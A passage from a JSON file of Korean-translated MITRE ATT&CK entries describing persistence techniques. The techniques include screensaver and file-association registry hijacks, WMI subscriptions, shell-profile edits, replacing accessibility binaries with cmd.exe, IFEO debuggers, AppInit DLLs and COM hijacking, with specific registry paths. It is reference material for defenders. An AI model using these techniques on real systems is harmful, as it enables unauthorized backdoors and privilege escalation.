노드에서도 가능합니다. (출처: Aquasec Kubernetes Attack 2023) (출처: Kubernetes DaemonSet) Pods는 `nodeSelector` 또는 `nodeName` 필드를 사용하여 특정 노드에 배포할 수도 있습니다. (출처: Kubernetes Assigning Pods to Nodes) (출처: AppSecco Kubernetes Namespace Breakout 2020)\n\n컨테이너는 또한 [Systemd 서비스](https://attack.mitre.org/techniques/T1543/002)로 실행되도록 구성할 수 있다는 점에 유의해야 합니다. (출처: Podman Systemd) (출처: Docker Systemd)",
      "external_id": "T1543.005",
      "modified": "2024-04-16T12:35:38.832Z",
      "title": "Container Service",
      "translated": true
    },
    {
      "description": "공격자는 특정 이벤트를 기반으로 실행을 유도하는 시스템 메커니즘을 사용하여 지속성을 설정하거나 권한을 상승시킬 수 있습니다. 다양한 운영 체제에는 로그온 또는 특정 애플리케이션/바이너리 실행과 같은 사용자 활동을 모니터링하고 구독할 수 있는 수단이 있습니다. 클라우드 환경 또한 특정 클라우드 이벤트에 대한 응답으로 모니터링하고 호출할 수 있는 다양한 기능과 서비스를 지원할 수 있습니다. (인용: AWS 계정에 대한 백도어)(인용: Varonis Power Automate 데이터 유출)(인용: Microsoft DART 사례 보고서 001)\n\n공격자는 이러한 메커니즘을 악용하여 피해자에 대한 지속적인 접근을 유지하기 위해 악성 코드를 반복적으로 실행할 수 있습니다. 피해자 시스템에 접근한 후, 공격자는 이벤트 트리거를 생성하거나 수정하여 이벤트 트리거가 호출될 때 실행될 악성 콘텐츠를 가리키게 할 수 있습니다. (인용: FireEye WMI 2015)(인용: OS X에서의 악성코드 지속성)(인용: amnesia 악성코드)\n\n실행이 SYSTEM 또는 서비스 계정과 같은 높은 권한을 가진 계정에 의해 대리 실행될 수 있기 때문에, 공격자는 이러한 트리거된 실행 메커니즘을 악용하여 권한을 상승시킬 수 있습니다.",
      "external_id": "T1546",
      "modified": "2024-10-15T15:57:00.731Z",
      "title": "Event Triggered Execution",
      "translated": true
    },
    {
      "description": "적대 세력은 파일 유형 연결에 의해 트리거되는 악성 콘텐츠를 실행하여 지속성을 확립할 수 있습니다. 파일이 열릴 때, 파일을 여는 데 사용되는 기본 프로그램(파일 연결 또는 핸들러라고도 함)이 확인됩니다. 파일 연결 선택은 Windows 레지스트리에 저장되며, 사용자가, 관리자 또는 레지스트리 접근 권한을 가진 프로그램 또는 내장된 assoc 유틸리티를 사용하는 관리자가 편집할 수 있습니다.(출처: Microsoft 기본 프로그램 변경)(출처: Microsoft 파일 핸들러)(출처: Microsoft Assoc 2017년 10월) 애플리케이션은 주어진 파일 확장자의 파일 연결을 수정하여 해당 확장자를 가진 파일이 열릴 때 임의의 프로그램을 호출할 수 있습니다.\n\n시스템 파일 연결은 <code>HKEY_CLASSES_ROOT\\.[extension]</code> 아래에 나열되며, 예를 들어 <code>HKEY_CLASSES_ROOT\\.txt</code>와 같습니다. 이 항목들은 <code>HKEY_CLASSES_ROOT\\\\[handler]</code>에 위치한 해당 확장자의 핸들러를 가리킵니다. 다양한 명령은 그 다음 <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>에 있는 서브키로 나열됩니다. 예를 들어:\n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\n나열된 키의 값은 핸들러가 파일 확장자를 열 때 실행되는 명령입니다. 적대 세력은 이러한 값을 수정하여 임의의 명령을 지속적으로 실행할 수 있습니다.(출처: TrendMicro TROJ-FAKEAV 2012년 10월)",
      "external_id": "T1546.001",
      "modified": "2024-09-12T15:27:11.065Z",
      "title": "Change Default File Association",
      "translated": true
    },
    {
      "description": "위협 행위자는 사용자 비활성 상태가 일정 시간 지속된 후에 악성 콘텐츠를 실행함으로써 지속성을 확립할 수 있습니다. 화면 보호기는 사용자 비활성 상태가 설정된 시간 이후에 실행되는 프로그램으로, .scr 파일 확장자를 가진 휴대용 실행 파일(PE)로 구성됩니다. (출처: 위키백과 화면 보호기) Windows 화면 보호기 애플리케이션인 scrnsave.scr는 <code>C:\\Windows\\System32\\</code>와 64비트 Windows 시스템의 경우 <code>C:\\Windows\\sysWOW64\\</code>에 위치하며, 기본 Windows 설치에 포함된 화면 보호기도 있습니다.\n\n다음 화면 보호기 설정은 레지스트리에 저장되어 있으며(<code>HKCU\\Control Panel\\Desktop\\</code>), 이를 조작하여 지속성을 달성할 수 있습니다:\n\n* <code>SCRNSAVE.exe</code> - 악성 PE 경로로 설정\n* <code>ScreenSaveActive</code> - 화면 보호기를 활성화하기 위해 '1'로 설정\n* <code>ScreenSaverIsSecure</code> - 잠금을 해제할 때 비밀번호를 요구하지 않도록 '0'으로 설정\n* <code>ScreenSaveTimeout</code> - 화면 보호기가 실행되기 전에 사용자 비활성 상태의 타임아웃을 설정\n\n위협 행위자는 특정 시간 동안 사용자 비활성 상태가 지속된 후 악성 소프트웨어를 실행하도록 화면 보호기를 설정하여 지속성을 유지할 수 있습니다. (출처: ESET Gazer 2017년 8월)",
      "external_id": "T1546.002",
      "modified": "2023-07-28T18:17:34.185Z",
      "title": "Screensaver",
      "translated": true
    },
    {
      "description": "적대 세력은 Windows Management Instrumentation(WMI) 이벤트 구독에 의해 트리거되는 악성 콘텐츠를 실행하여 지속성을 확보하고 권한을 상승시킬 수 있습니다. WMI는 정의된 이벤트가 발생할 때 코드를 실행하는 이벤트 필터, 프로바이더, 소비자 및 바인딩을 설치하는 데 사용될 수 있습니다. 구독할 수 있는 이벤트의 예로는 시계 시간, 사용자 로그인 또는 컴퓨터의 가동 시간이 있습니다. (인용: Mandiant M-Trends 2015)\n\n적대 세력은 WMI의 기능을 사용하여 이벤트에 구독하고 그 이벤트가 발생할 때 임의의 코드를 실행하여 시스템에서 지속성을 제공할 수 있습니다. (인용: FireEye WMI SANS 2015)(인용: FireEye WMI 2015) 또한 적대 세력은 `mofcomp.exe`를 사용하여 WMI 스크립트를 컴파일하여 악성 구독을 만드는 데 사용할 수 있는 Windows 관리 개체(MOF) 파일(.mof 확장자)로 변환할 수 있습니다. (인용: Dell WMI Persistence)(인용: Microsoft MOF May 2018)\n\nWMI 구독 실행은 WMI 프로바이더 호스트 프로세스(WmiPrvSe.exe)에 의해 프록시되어 처리되므로 SYSTEM 권한이 상승할 수 있는 결과를 초래할 수 있습니다.",
      "external_id": "T1546.003",
      "modified": "2024-04-13T14:08:20.882Z",
      "title": "Windows Management Instrumentation Event Subscription",
      "translated": true
    },
    {
      "description": "적대자들은 사용자의 셸에 의해 트리거되는 악성 명령을 실행하여 지속성을 확립할 수 있습니다. 사용자 [유닉스 셸](https://attack.mitre.org/techniques/T1059/004)은 이벤트에 따라 세션의 여러 지점에서 여러 구성 스크립트를 실행합니다. 예를 들어 사용자가 명령 줄 인터페이스를 열거나 원격으로 로그인할 때(예: SSH를 통해) 로그인 셸이 시작됩니다. 로그인 셸은 환경을 설정하기 위해 시스템(<code>/etc</code>) 및 사용자의 홈 디렉토리(<code>~/</code>)의 스크립트를 실행합니다. 모든 시스템의 로그인 셸은 시작 시 /etc/profile을 사용합니다. 이러한 구성 스크립트는 해당 디렉토리의 권한 수준에서 실행되며, 종종 환경 변수를 설정하고, 별칭을 생성하며, 사용자의 환경을 사용자 정의하는 데 사용됩니다. 셸이 종료되거나 중단될 때 추가적인 셸 스크립트가 실행되어 셸이 적절하게 종료되도록 합니다. \n\n적대자들은 셸에 의해 자동으로 실행되는 스크립트에 명령을 삽입하여 지속성을 확립하려고 시도할 수 있습니다. 대부분의 GNU/Linux 시스템의 기본 셸인 bash를 예로 들면, 적대자들은 악성 바이너리를 시작하는 명령을 <code>/etc/profile</code> 및 <code>/etc/profile.d</code> 파일에 추가할 수 있습니다.(인용: intezer-kaiji-malware)(인용: bencane 블로그 bashrc) 이러한 파일은 일반적으로 수정하려면 루트 권한이 필요하며 시스템의 어떤 셸이 시작될 때마다 실행됩니다. 사용자 수준 권한의 경우 적대자들은 사용자가 명령 줄 인터페이스를 열거나 원격으로 연결할 때 소스되는 <code>~/.bash_profile</code>, <code>~/.bash_login</code> 또는 <code>~/.profile</code>에 악성 명령을 삽입할 수 있습니다.(인용: anomali-rocke-tactics)(인용: Linux 매뉴얼 bash 호출) 시스템은 나열된 순서에서 처음 존재하는 파일만 실행하므로, 적대자들은 실행을 보장하기 위해 <code>~/.bash_profile</code>을 사용해왔습니다. 적대자들은 원격으로 연결이 설정되거나 추가적인 대화형 셸이 열리는 경우 추가로 실행되는 <code>~/.bashrc</code> 파일도 이용해왔습니다.(인용: Tsunami)(인용: anomali-rocke-tactics)(인용: anomali-linux-rabbit)(인용: Magento) 일부 악성코드는 프로그램 종료를 트리거로 삼아 실행를 유도하므로, 적대자들은 세션 종료 시 악성 명령을 실행하기 위해 <code>~/.bash_logout</code> 파일을 사용할 수 있습니다.\n\nmacOS의 경우, 이 기술의 기능은 유사하지만 macOS 10.15 이상에 기본 셸인 zsh를 활용할 수 있습니다. Terminal.app을 열면 애플리케이션이 zsh 로그인 셸과 zsh 대화형 셸을 시작합니다. 로그인 셸은 <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zlogin</code>을 사용하여 시스템 환경을 구성합니다.(인용: ScriptingOSX zsh)(인용: PersistentJXA_leopitt)(인용: code_persistence_zsh)(인용: macOS MS office sandbox escape) 로그인 셸은 이후 <code>~/.zprofile</code>와 <code>~/.zlogin</code>을 사용하여 사용자 환경을 구성합니다. 대화형 셸은 <code>~/.zshrc</code>를 사용하여 사용자 환경을 설정합니다. 종료 시 <code>/etc/zlogout</code> 및 <code>~/.zlogout</code>가 실행됩니다. 레거시 프로그램의 경우, macOS는 시작 시 <code>/etc/bashrc</code>를 실행합니다.",
      "external_id": "T1546.004",
      "modified": "2024-09-25T15:02:24.143Z",
      "title": "Unix Shell Configuration Modification",
      "translated": true
    },
    {
      "description": "위협 세력은 인터럽트 신호에 의해 트리거되는 악성 콘텐츠를 실행하여 지속성을 확보할 수 있습니다. <code>trap</code> 명령은 프로그램과 셸이 인터럽트 신호를 수신했을 때 실행할 명령을 지정할 수 있게 해줍니다. 일반적인 예로는 스크립트가 <code>ctrl+c</code> 및 <code>ctrl+d</code>와 같은 일반적인 키보드 인터럽트를 관리하며 정상적으로 종료할 수 있도록 하는 경우가 있습니다.\n\n위협 세력은 이를 사용하여 쉘이 특정 인터럽트를 만났을 때 실행될 코드를 등록할 수 있으며, 이를 지속성 메커니즘으로 활용할 수 있습니다. 트랩 명령은 다음과 같은 형식을 가집니다: <code>trap 'command list' signals</code> 여기서 \"command list\"는 \"signals\"가 수신되었을 때 실행됩니다. (출처: Trap Manual)(출처: Cyberciti Trap Statements)",
      "external_id": "T1546.005",
      "modified": "2020-03-24T16:43:02.273Z",
      "title": "Trap",
      "translated": true
    },
    {
      "description": "위협 행위자는 손상된 바이너리 실행에 의해 트리거된 악성 콘텐츠를 실행하여 지속성을 확립할 수 있습니다. Mach-O 바이너리는 바이너리가 로드될 때 특정 작업을 수행하는 데 사용되는 여러 헤더를 가지고 있습니다. Mach-O 바이너리의 LC_LOAD_DYLIB 헤더는 macOS 및 OS X에 실행 시간 동안 어떤 동적 라이브러리(dylibs)를 로드할지를 알려줍니다. 이러한 라이브러리는 나머지 필드와 종속성을 조정하는 한, 컴파일된 바이너리에 임의로 추가할 수 있습니다. (출처: Writing Bad Malware for OSX) 이러한 변경을 수행할 수 있는 도구가 존재합니다.\n\n위협 행위자는 Mach-O 바이너리 헤더를 수정하여 바이너리가 실행될 때마다 악성 dylibs를 로드하고 실행할 수 있습니다. 바이너리가 수정되기 때문에 어떠한 변경도 바이너리의 디지털 서명을 무효화하지만, LC_CODE_SIGNATURE 명령을 바이너리에서 제거함으로써 이 문제를 해결할 수 있으므로 서명이 로드 시간에 확인되지 않게 할 수 있습니다. (출처: Malware Persistence on OS X)",
      "external_id": "T1546.006",
      "modified": "2022-04-20T17:08:21.101Z",
      "title": "LC_LOAD_DYLIB Addition",
      "translated": true
    },
    {
      "description": "적대자는 Netsh Helper DLLs에 의해 트리거되는 악성 콘텐츠를 실행함으로써 지속성을 확립할 수 있습니다. Netsh.exe(또는 Netshell로도 알려짐)는 시스템의 네트워크 구성과 상호 작용하는 데 사용되는 명령줄 스크립팅 유틸리티입니다. 이 유틸리티의 기능을 확장하기 위해 헬퍼 DLL을 추가하는 기능이 포함되어 있습니다. (출처: TechNet Netsh) 등록된 netsh.exe 헬퍼 DLL의 경로는 Windows 레지스트리에 <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>로 입력됩니다.\n\n적대자는 netsh.exe 헬퍼 DLL을 사용하여 임의 코드의 실행을 지속적으로 트리거할 수 있습니다. 이 실행은 netsh.exe가 실행될 때마다 발생하며, 이는 자동으로, 다른 지속성 기술과 함께 발생할 수 있거나, 시스템에 설치된 다른 소프트웨어(예: VPN)가 정상 기능의 일환으로 netsh.exe를 실행할 경우 발생할 수 있습니다. (출처: Github Netsh Helper CS Beacon)(출처: Demaske Netsh Persistence)",
      "external_id": "T1546.007",
      "modified": "2022-04-20T17:09:17.363Z",
      "title": "Netsh Helper DLL",
      "translated": true
    },
    {
      "description": "상대방은 접근성 기능에 의해 트리거된 악성 콘텐츠를 실행함으로써 지속성을 확보하거나 권한을 상승시킬 수 있습니다. Windows는 사용자가 로그인하기 전에 키 조합으로 실행될 수 있는 접근성 기능을 포함하고 있습니다(예: 사용자가 Windows 로그인 화면에 있을 때). 상대방은 이러한 프로그램의 실행 방법을 수정하여 시스템에 로그인하지 않고도 명령 프롬프트나 백도어를 얻을 수 있습니다.\n\n두 가지 일반적인 접근성 프로그램은 <code>C:\\Windows\\System32\\sethc.exe</code>로, Shift 키를 다섯 번 누르면 실행되며, <code>C:\\Windows\\System32\\utilman.exe</code>로, Windows + U 키 조합이 눌릴 때 실행됩니다. sethc.exe 프로그램은 종종 \"Sticky Keys\"로 불리며, 원격 데스크톱 로그인 화면을 통해 인증되지 않은 접근에 사용되었습니다. (출처: FireEye Hikit Rootkit)\n\nWindows 버전에 따라 상대방은 이러한 기능을 다양한 방법으로 활용할 수 있습니다. 상대방이 일반적으로 사용하는 방법에는 접근성 기능 바이너리 또는 레지스트리의 이러한 바이너리에 대한 포인터/참조를 교체하는 것이 포함됩니다. 최신 Windows 버전에서는 교체된 바이너리가 x64 시스템에 대해 디지털 서명되어야 하며, 바이너리는 <code>%systemdir%\\</code>에 있어야 하고, Windows 파일 또는 리소스 보호(WFP/WRP)로 보호되어야 합니다. (출처: DEFCON2016 Sticky Keys) [이미지 파일 실행 옵션 주입](https://attack.mitre.org/techniques/T1546/012) 디버거 방법은 해당 접근성 기능 바이너리를 교체할 필요가 없으므로 잠재적인 우회 방법으로 발견된 것으로 보입니다.\n\nWindows XP 및 이후 버전, 그리고 Windows Server 2003/R2 이후 버전의 경우, 예를 들어, 프로그램(예: <code>C:\\Windows\\System32\\utilman.exe</code>)을 \"cmd.exe\"(또는 백도어 접근을 제공하는 다른 프로그램)로 교체할 수 있습니다. 그런 다음 로그인 화면에서 키보드 앞에 앉아 있거나 [원격 데스크톱 프로토콜](https://attack.mitre.org/techniques/T1021/001)로 연결된 상태에서 적절한 키 조합을 누르면 교체된 파일이 SYSTEM 권한으로 실행됩니다. (출처: Tilbury 2014)\n\n유사한 방식으로 활용될 수 있는 다른 접근성 기능도 존재합니다: (출처: DEFCON2016 Sticky Keys)(출처: Narrator Accessibility Abuse)\n\n* 화면 키보드: <code>C:\\Windows\\System32\\osk.exe</code>\n* 확대경: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* 내레이터: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* 디스플레이 전환기: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* 앱 전환기: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
      "external_id": "T1546.008",
      "modified": "2023-04-21T12:33:18.602Z",
      "title": "Accessibility Features",
      "translated": true
    },
    {
      "description": "적대자들은 AppCert DLL이 프로세스에 로드될 때 트리거된 악성 콘텐츠를 실행하여 지속성을 설정하거나 권한을 상승시킬 수 있습니다. <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> 아래의 <code>AppCertDLLs</code> 레지스트리 키에 지정된 동적 링크 라이브러리(DLL)는 <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, 또는 <code>WinExec</code>와 같은 일반적으로 사용되는 응용 프로그래밍 인터페이스(API) 함수가 호출되는 모든 프로세스에 로드됩니다. (출처: Elastic Process Injection 2017년 7월)\n\n[프로세스 주입](https://attack.mitre.org/techniques/T1055)와 유사하게, 이 값은 악성 DLL이 컴퓨터의 별도 프로세스에서 로드되고 실행되도록 하여 권한을 상승시키는 데 악용될 수 있습니다. 악성 AppCert DLL은 API 활동에 의해 지속적으로 트리거되어 지속성을 제공할 수도 있습니다.",
      "external_id": "T1546.009",
      "modified": "2020-11-10T18:29:31.052Z",
      "title": "AppCert DLLs",
      "translated": true
    },
    {
      "description": "공격자는 AppInit DLL에 의해 프로세스에 로드된 악성 코드를 실행함으로써 지속성을 확보하거나 특권을 상승시킬 수 있습니다. 레지스트리 키 <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> 또는 <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>의 <code>AppInit_DLLs</code> 값에 지정된 동적 링크 라이브러리(DLL)는 user32.dll에 의해 모든 프로세스에 로드되며, 이 프로세스는 user32.dll을 로드합니다. 실제로 user32.dll은 매우 일반적인 라이브러리이므로 거의 모든 프로그램에 해당합니다. (출처: Elastic Process Injection 2017년 7월)\n\n프로세스 주입과 유사하게, 이러한 값은 악성 DLL이 컴퓨터의 별도 프로세스 컨텍스트에서 로드되고 실행되도록 하여 특권 상승을 얻기 위해 악용될 수 있습니다. (출처: AppInit 레지스트리) 악성 AppInit DLL은 API 활동에 의해 지속적으로 트리거되어 지속성을 제공할 수도 있습니다.\n\nAppInit DLL 기능은 안전 부팅이 활성화된 경우 Windows 8 및 이후 버전에서 비활성화됩니다. (출처: AppInit 안전 부팅)",
      "external_id": "T1546.010",
      "modified": "2023-04-21T12:33:45.568Z",
      "title": "AppInit DLLs",
      "translated": true
    },
    {
      "description": "공격자는 애플리케이션 쉼에 의해 트리거된 악성 콘텐츠를 실행함으로써 지속성을 확립하거나 권한을 상승시킬 수 있습니다. 마이크로소프트 윈도우 애플리케이션 호환성 인프라/프레임워크(애플리케이션 쉼)는 운영 체제 코드베이스가 시간에 따라 변경됨에 따라 소프트웨어의 하위 호환성을 허용하기 위해 만들어졌습니다. 예를 들어, 애플리케이션 쉼 기능은 개발자가 윈도우 XP용으로 작성된 애플리케이션에 대해 코드를 다시 작성하지 않고도 윈도우 10에서 작동하도록 수정할 수 있게 합니다. (출처: Elastic Process Injection 2017년 7월)\n\n이 프레임워크 내에서, 쉼은 프로그램(보다 구체적으로는 가져오기 주소 테이블)과 윈도우 OS 간의 버퍼로 작용하도록 생성됩니다. 프로그램이 실행될 때, 쉼 캐시는 프로그램이 쉼 데이터베이스(.sdb)를 사용할 필요가 있는지를 결정하기 위해 참조됩니다. 필요한 경우, 쉼 데이터베이스는 후킹을 사용하여 코드를 OS와 통신하기 위해 필요한 대로 리디렉션합니다.\n\n기본 윈도우 설치 프로그램(sdbinst.exe)에 의해 현재 설치된 모든 쉼의 목록은 다음에 저장됩니다:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> 및\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\n사용자 정의 데이터베이스는 다음에 저장됩니다:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> 및\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\n쉼을 안전하게 유지하기 위해, 윈도우는 쉼이 사용자 모드에서 실행되도록 설계하여 커널을 수정할 수 없고, 쉼을 설치하기 위해서는 관리자 권한이 필요합니다. 그러나 특정 쉼은 [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1548/002)(UAC 및 RedirectEXE), 프로세스에 DLL 삽입(InjectDLL), 데이터 실행 방지 비활성화(DisableNX) 및 구조적 예외 처리 비활성화(DisableSEH), 메모리 주소 가로채기(GetProcAddress)에 사용될 수 있습니다.\n\n이러한 쉼을 활용하면 공격자는 권한 상승, 백도어 설치, 윈도우 디펜더와 같은 방어 비활성화 등의 여러 악성 행위를 수행할 수 있습니다. (출처: FireEye Application Shimming) 쉼은 영향을 받는 프로그램에 의해 지속적으로 호출됨으로써 지속성을 확립하는 데에도 악용될 수 있습니다.",
      "external_id": "T1546.011",
      "modified": "2020-11-10T18:29:31.094Z",
      "title": "Application Shimming",
      "translated": true
    },
    {
      "description": "공격자는 이미지 파일 실행 옵션(IFEOS) 디버거에 의해 트리거된 악성 콘텐츠를 실행하여 지속성을 수립하거나 권한을 상승시킬 수 있습니다. IFEO는 개발자가 애플리케이션에 디버거를 연결할 수 있도록 합니다. 프로세스가 생성될 때 애플리케이션의 IFEO에 존재하는 디버거가 애플리케이션의 이름 앞에 추가되어, 새로운 프로세스가 디버거 아래에서 실행됩니다 (예: <code>C:\\dbg\\ntsd.exe -g notepad.exe</code>). (출처: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEO는 레지스트리를 통해 직접 설정하거나 GFlags 도구의 글로벌 플래그에서 설정할 수 있습니다. (출처: Microsoft GFlags Mar 2017) IFEO는 레지스트리의 <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> 아래의 <code>Debugger</code> 값으로 표시되며, 여기서 <code>&lt;executable&gt;</code>은 디버거가 연결된 바이너리입니다. (출처: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEO는 또한 특정 프로그램이 조용히 종료될 때 임의의 모니터 프로그램을 실행할 수 있게 합니다 (즉, 스스로 또는 두 번째 비 커널 모드 프로세스에 의해 조기에 종료됨). (출처: Microsoft Silent Process Exit NOV 2017) (출처: Oddvar Moe IFEO APR 2018) 디버거와 유사하게, 조용한 종료 모니터링은 GFlags를 통해 및/하거나 IFEO 및 조용한 프로세스 종료 레지스트리 값을 <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>에서 직접 수정하여 활성화할 수 있습니다. (출처: Microsoft Silent Process Exit NOV 2017) (출처: Oddvar Moe IFEO APR 2018)\n\n[접근성 기능](https://attack.mitre.org/techniques/T1546/008)과 유사하게, Windows Vista 및 이후 버전과 Windows Server 2008 및 이후 버전에서는 \"cmd.exe\" 또는 백도어 접근을 제공하는 다른 프로그램을 접근성 프로그램(ex: utilman.exe)의 \"디버거\"로 설정하는 레지스트리 키가 수정될 수 있습니다. 레지스트리가 수정된 후 로그인 화면에서 적절한 키 조합을 눌렀을 때 키보드에 있거나 [원격 데스크탑 프로토콜](https://attack.mitre.org/techniques/T1021/001)에 연결되어 있을 때 \"디버거\" 프로그램이 SYSTEM 권한으로 실행됩니다. (출처: Tilbury 2014)\n\n[프로세스 주입](https://attack.mitre.org/techniques/T1055)와 유사하게, 이러한 값은 악성 실행 파일이 컴퓨터의 별도 프로세스 맥락에서 로드되고 실행되도록 하여 권한 상승을 얻기 위해 악용될 수 있습니다. (출처: Elastic Process Injection July 2017) IFEO 메커니즘을 설치하면 지속성을 제공하기 위해 지속적인 트리거된 호출을 통해 지속성을 제공할 수 있습니다.\n\n악성 소프트웨어는 또한 유효하지 않은 디버거를 등록하여 시스템 및 보안 애플리케이션을 효과적으로 비활성화하고 우회하기 위해 IFEO를 사용할 수 있습니다. (출처: FSecure Hupigon) (출처: Symantec Ushedix June 2008)",
      "external_id": "T1546.012",
      "modified": "2020-11-10T18:29:31.112Z",
      "title": "Image File Execution Options Injection",
      "translated": true
    },
    {
      "description": "대적자는 PowerShell 프로필에 의해 트리거되는 악성 콘텐츠를 실행하여 지속성을 유지하고 권한을 상승시킬 수 있습니다. PowerShell 프로필(<code>profile.ps1</code>)은 PowerShell이 시작될 때 실행되는 스크립트로, 사용자 환경을 맞춤 설정하기 위해 로그인 스크립트로 사용할 수 있습니다.\n\nPowerShell은 사용자 또는 호스트 프로그램에 따라 여러 프로필을 지원합니다. 예를 들어, PowerShell 콘솔, PowerShell ISE 또는 Visual Studio Code와 같은 다양한 PowerShell 호스트 프로그램에 대해 서로 다른 프로필이 있을 수 있습니다. 또한 관리자는 로컬 컴퓨터의 모든 사용자와 호스트 프로그램에 적용되는 프로필을 구성할 수 있습니다. (출처: Microsoft 프로필에 대한 설명)\n\n대적자는 이러한 프로필을 수정하여 임의의 명령, 함수, 모듈 및/또는 PowerShell 드라이브를 포함시켜 지속성을 얻을 수 있습니다. 사용자가 PowerShell 세션을 열 때마다 수정된 스크립트가 실행됩니다. 단, 실행할 때 <code>-NoProfile</code> 플래그를 사용하면 실행되지 않습니다. (출처: ESET Turla PowerShell 2019년 5월)\n\n대적자는 또한 PowerShell 프로필에서 스크립트가 더 높은 권한을 가진 계정, 예를 들어 도메인 관리자에 의해 로드되고 실행될 경우 권한을 상승시킬 수 있습니다. (출처: Wits End 및 Shady PowerShell Profiles)",
      "external_id": "T1546.013",
      "modified": "2023-10-20T17:04:13.976Z",
      "title": "PowerShell Profile",
      "translated": true
    },
    {
      "description": "공격자는 Event Monitor Daemon(emond)에 의해 트리거된 악성 콘텐츠를 실행함으로써 지속성을 확보하고 권한을 상승시킬 수 있습니다. Emond는 다양한 서비스로부터 이벤트를 수집하고 이를 간단한 규칙 엔진을 통해 처리하며 행동을 취하는 [런치 데몬](https://attack.mitre.org/techniques/T1543/004)입니다. <code>/sbin/emond</code>에 있는 emond 바이너리는 <code>/etc/emond.d/rules/</code> 디렉토리에서 규칙을 로드하고 명시적으로 정의된 이벤트가 발생하면 행동을 취합니다.\n\n규칙 파일은 plist 형식으로 작성되며, 이름, 이벤트 유형 및 취할 행동을 정의합니다. 이벤트 유형의 예로는 시스템 시작 및 사용자 인증이 있으며, 행동의 예로는 시스템 명령을 실행하거나 이메일을 전송하는 것 등이 있습니다. emond 서비스는 <code>/private/var/db/emondClients</code> 경로에 파일이 없을 경우 실행되지 않으며, 이 경로는 [런치 데몬](https://attack.mitre.org/techniques/T1543/004) 설정 파일 <code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>에 지정되어 있습니다.(출처: xorrior emond 2018년 1월)(출처: magnusviri emond 2016년 4월)(출처: sentinelone macos persist 2019년 6월)\n\n공격자는 정의된 이벤트가 발생할 때, 예를 들어 시스템 시작 또는 사용자 인증 시 명령을 실행하도록 하는 규칙을 작성하여 이 서비스를 악용할 수 있습니다.(출처: xorrior emond 2018년 1월)(출처: magnusviri emond 2016년 4월)(출처: sentinelone macos persist 2019년 6월) 또한, emond 서비스는 [런치 데몬](https://attack.mitre.org/techniques/T1543/004) 서비스에 의해 루트 권한으로 실행되기 때문에 공격자는 관리자 권한에서 루트 권한으로 상승할 수 있는 가능성도 있습니다.",
      "external_id": "T1546.014",
      "modified": "2022-04-20T00:16:01.732Z",
      "title": "Emond",
      "translated": true
    },
    {
      "description": "적대 세력은 컴포넌트 오브젝트 모델(COM) 객체에 대한 탈취된 참조를 통해 트리거되는 악성 콘텐츠를 실행하여 지속성을 확보할 수 있습니다. COM은 운영 체제를 통해 소프트웨어 구성 요소 간의 상호 작용을 가능하게 하는 Windows 내의 시스템입니다. 다양한 COM 객체에 대한 참조는 레지스트리에 저장됩니다.\n\n적대 세력은 COM 시스템을 활용하여 정당한 소프트웨어를 실행하는 대신 악성 코드를 삽입할 수 있으며, 이를 위해 COM 참조 및 관계를 탈취하여 지속성을 유지할 수 있습니다. COM 객체를 탈취하려면, 정당한 시스템 구성 요소에 대한 참조를 교체하기 위해 레지스트리를 변경해야 합니다. 이로 인해 해당 구성 요소가 실행될 때 올바르게 작동하지 않을 수 있습니다. 정상적인 시스템 작업을 통해 해당 시스템 구성 요소가 실행되면 적대 세력의 코드가 대신 실행됩니다. 적대 세력은 충분히 자주 사용되는 객체를 탈취하여 일관된 수준의 지속성을 유지하려고 할 가능성이 높지만, 시스템의 눈에 띄는 기능을 방해하지 않을 정도로 이뤄져야 합니다. 이는 시스템 불안정성을 피하여 탐지를 방지하는 데 도움을 줍니다.",
      "external_id": "T1546.015",
      "modified": "2023-04-21T12:34:29.402Z",
      "title": "Component Object Model Hijacking",
      "translated": true
    },
    {
